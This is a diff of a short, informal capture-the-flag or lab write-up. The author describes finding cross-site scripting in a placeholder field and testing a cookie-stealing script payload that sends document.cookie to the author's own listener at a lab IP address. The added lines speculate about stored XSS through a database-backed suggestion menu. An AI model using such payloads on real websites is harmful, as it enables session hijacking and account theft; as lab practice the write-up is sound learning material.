@@ -46,4 +46,6 @@ well ...... let me tell you something we got xss, in the placeholder where you s
 ![alt text](image-8.png)\
 so we have XSS, let's see what we can do, let's try to steal some cookies:
 ``` <script>document.location='http://10.10.16.18:9999/?c='+document.cookie</script> ```, hm got nothing,that took me here : ![alt text](image-10.png)\
-that's my device XD, 
+that's my device XD (with the files where the root of the python server i hosted is )
+
+it's been a long time, so im thinking on going back and submitting a normal server, u see it displays again the suggestion menues, meaning it's stored in a database with id 4 for this example, what if its not sanitized
